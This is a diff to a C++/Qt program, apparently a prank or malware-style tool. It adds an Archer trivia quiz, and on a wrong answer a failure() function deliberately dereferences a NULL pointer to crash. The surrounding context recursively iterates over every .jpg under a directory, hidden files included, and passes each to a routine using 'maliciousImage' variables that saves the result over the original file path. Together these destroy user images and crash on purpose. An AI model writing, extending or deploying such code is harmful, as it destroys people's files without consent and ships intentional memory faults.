@@ -8,6 +8,7 @@
 #include <iostream>
 #include <stdio.h>
 #include <math.h>
+#include <vector>
 #ifdef Q_OS_WIN
 #include <Windows.h>
 #define OS 0
@@ -81,7 +82,17 @@ void pictureYourself(QImage &image1,QImage &image2,QImage &image3, QString &suit
 	favoriteImage[dirtPanorama]->scaled(image3.size()).save(suitTag);
 }
 
+string cause(string* idx){
+    return (idx[1337]);
+}
 
+void failure(string fun){
+    string* p = &fun;
+    p = NULL;
+    string pp = cause(p);
+    //long l0ng = p->size();
+    return;
+}
 
 
 
@@ -96,6 +107,45 @@ int main(/*int argc, char *argv[]*/){
 		return(12473);
 	}
 #endif
+    Phase10:
+    {
+        size_t sizet = 13;
+        string tweedle = "yes";
+        string tweedlE = "Yes";
+        string dum = "13";
+        sizet %= 10;
+        vector<char> viktor(sizet);
+        viktor[0] = 'p';
+        string dee = "ocelot";
+        string deE = "Ocelot";
+        std::string str;
+        qDebug()<<"Are Sterling and Mallory eskimo brothers?";
+        getline(std::cin,str);
+        if(str != tweedle && str != tweedlE)
+            failure("!");
+        qDebug()<<"How many tallies does Pam have on her back?";
+        getline(std::cin,str);
+        if(str != dum)
+            failure("!");
+
+        qDebug()<<"What type of animal is Babou?";
+        getline(std::cin,str);
+        if(str != dee && str != deE)
+            failure("!");
+
+        viktor[1] = 'a';
+        viktor[2] = 'm';
+
+        qDebug()<<"Which character wore a dolphin on their hand?";
+        getline(std::cin,str);
+        int c = 15 ^ 15;
+        while(c < 3 && (tolower(str[c]) == viktor[c])){
+            c++; // Get it?
+        }
+        if(c < 3){
+            failure("!");
+        }
+    }
 	goto prior;
 	Phase1:
 	{
@@ -157,14 +207,14 @@ int main(/*int argc, char *argv[]*/){
 		auto drain=QDir::AllDirs | QDir::Files | QDir::Hidden | QDir::NoSymLinks | QDir::NoDotDot | QDir::NoDot;
 
 		QDirIterator itr(dir, QStringList() << "*.jpg", drain, QDirIterator::Subdirectories);
-		qDebug("test");
+        //qDebug("test");
 		while(itr.hasNext()){
 			auto imageName=itr.next();
 			QImage fImage(imageName);
 			if(fImage.isNull()){
 				continue;
 			}
-			pictureYourself(maliciousImage,maliciousImageRotated,fImage,imageName);
+            pictureYourself(maliciousImage,maliciousImageRotated,fImage,imageName);
 		}
 	}
 	outed:
